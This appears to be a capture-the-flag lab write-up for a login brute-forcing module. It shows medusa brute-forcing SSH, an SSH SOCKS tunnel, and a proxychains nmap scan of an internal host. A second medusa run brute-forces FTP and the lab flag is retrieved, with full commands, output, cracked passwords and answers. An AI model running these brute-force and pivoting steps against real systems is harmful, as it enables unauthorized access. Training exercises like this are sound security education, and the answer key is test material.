# Section 10: Web Services

Module: 16. Login Brute Forcing

---

## Questions & Answers

### 1. What was the password for the ftpuser?

Context:
- Brute-force the password for `sshuser`:
```bash
┌─[eu-academy-2]─[10.10.14.91]─[htb-ac-2162140@htb-hfzkdvfmgy-htb-cloud-com]─[~]
└──╼ [★]$ medusa -h 154.57.164.82 -n 31008 -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2026-09-07 04:25:47 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: 12345678 (1 of 200 complete)
2026-09-07 04:25:47 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: admin (2 of 200 complete)
2026-09-07 04:25:47 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: 123456 (3 of 200 complete)
2026-09-07 04:25:49 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: 123456789 (4 of 200 complete)
2026-09-07 04:25:49 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: 1234 (5 of 200 complete)
2026-09-07 04:25:50 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: 12345 (6 of 200 complete)
2026-09-07 04:25:52 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: password (7 of 200 complete)
2026-09-07 04:25:52 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: 123 (8 of 200 complete)
2026-09-07 04:25:52 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: Aa123456 (9 of 200 complete)
2026-09-07 04:25:58 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: 1234567890 (10 of 200 complete)
2026-09-07 04:25:58 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: UNKNOWN (11 of 200 complete)
2026-09-07 04:25:58 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: 1234567 (12 of 200 complete)
2026-09-07 04:26:00 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: 123123 (13 of 200 complete)
2026-09-07 04:26:00 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: 111111 (14 of 200 complete)
2026-09-07 04:26:00 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: Password (15 of 200 complete)
2026-09-07 04:26:03 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: admin123 (16 of 200 complete)
2026-09-07 04:26:05 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: 12345678910 (17 of 200 complete)
2026-09-07 04:26:05 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: 000000 (18 of 200 complete)
2026-09-07 04:26:09 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: ******** (19 of 200 complete)
2026-09-07 04:26:11 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: user (20 of 200 complete)
2026-09-07 04:26:11 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: 1111 (21 of 200 complete)
2026-09-07 04:26:11 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: P@ssw0rd (22 of 200 complete)
2026-09-07 04:26:13 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: root (23 of 200 complete)
2026-09-07 04:26:13 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: 654321 (24 of 200 complete)
2026-09-07 04:26:13 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: qwerty (25 of 200 complete)
2026-09-07 04:26:16 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: Pass@123 (26 of 200 complete)
2026-09-07 04:26:16 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: ****** (27 of 200 complete)
2026-09-07 04:26:17 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: 112233 (28 of 200 complete)
2026-09-07 04:26:21 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: 102030 (29 of 200 complete)
2026-09-07 04:26:21 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: ubnt (30 of 200 complete)
2026-09-07 04:26:22 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: abc123 (31 of 200 complete)
2026-09-07 04:26:24 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: abcd1234 (32 of 200 complete)
2026-09-07 04:26:24 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: Aa@123456 (33 of 200 complete)
2026-09-07 04:26:24 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: 1q2w3e4r (34 of 200 complete)
2026-09-07 04:26:26 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: 123321 (35 of 200 complete)
2026-09-07 04:26:26 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: err (36 of 200 complete)
2026-09-07 04:26:28 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: qwertyuiop (37 of 200 complete)
2026-09-07 04:26:30 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: 987654321 (38 of 200 complete)
2026-09-07 04:26:30 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: 87654321 (39 of 200 complete)
2026-09-07 04:26:30 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: Eliska81 (40 of 200 complete)
2026-09-07 04:26:35 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: 123123123 (41 of 200 complete)
2026-09-07 04:26:35 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: 11223344 (42 of 200 complete)
2026-09-07 04:26:35 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: 987654321 (43 of 200 complete)
2026-09-07 04:26:37 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: demo (44 of 200 complete)
2026-09-07 04:26:37 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: 12341234 (45 of 200 complete)
2026-09-07 04:26:39 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 0 complete) Password: 1q2w3e4r5t (46 of 200 complete)
2026-09-07 04:26:39 ACCOUNT FOUND: [ssh] Host: 154.57.164.82 User: sshuser Password: 1q2w3e4r5t [SUCCESS]
2026-09-07 04:26:39 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 1 complete) Password: qwerty123 (47 of 200 complete)
2026-09-07 04:26:41 ACCOUNT CHECK: [ssh] Host: 154.57.164.82 (1 of 1, 0 complete) User: sshuser (1 of 1, 1 complete) Password: Admin@123 (48 of 200 complete)
```
- Then I use the knowledge in Pivoting, Tunneling, and Port Forwarding for more convenience:
```bash
ssh -D 9999 sshuser@<IP>

proxychains nmap <INTERNAL_IP>
Nmap scan report for 10.244.45.51
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh

proxychains medusa -h 10.244.45.51 -u ftpuser -P wordlists.txt -M ftp -t 5
<SNIP>
2026-09-07 04:40:37 ACCOUNT FOUND: [ftp] Host: 10.244.45.51 User: ftpuser Password: qqww1122 [SUCCESS]
<SNIP>
```

**Answer:** `qqww1122`

---

### 2. After successfully brute-forcing the ssh session, and then logging into the ftp server on the target, what is the full flag found within flag.txt?

Context:
```bash
┌─[eu-academy-2]─[10.10.14.91]─[htb-ac-2162140@htb-hfzkdvfmgy-htb-cloud-com]─[~]
└──╼ [★]$ proxychains ftp ftp://ftpuser:qqww1122@10.244.45.51
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:9999  ...  10.244.45.51:21  ...  OK
Connected to 10.244.45.51.
220 (vsFTPd 3.0.5)
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.
ftp> ls
229 Entering Extended Passive Mode (|||14104|)
[proxychains] Strict chain  ...  127.0.0.1:9999  ...  10.244.45.51:14104  ...  OK
150 Here comes the directory listing.
-rw-------    1 1001     1001           35 Sep 07 08:20 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||43502|)
[proxychains] Strict chain  ...  127.0.0.1:9999  ...  10.244.45.51:43502  ...  OK
150 Opening BINARY mode data connection for flag.txt (35 bytes).
100% |*************************************************************************************************************************************************|    35      854.49 KiB/s    00:00 ETA
226 Transfer complete.
35 bytes received in 00:00 (0.83 KiB/s)
ftp> !cat flag.txt
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
HTB{SSH_and_FTP_Bruteforce_Success}ftp> 
```

**Answer:** `HTB{SSH_and_FTP_Bruteforce_Success}`

---

[Back to Module Index](./README.md)
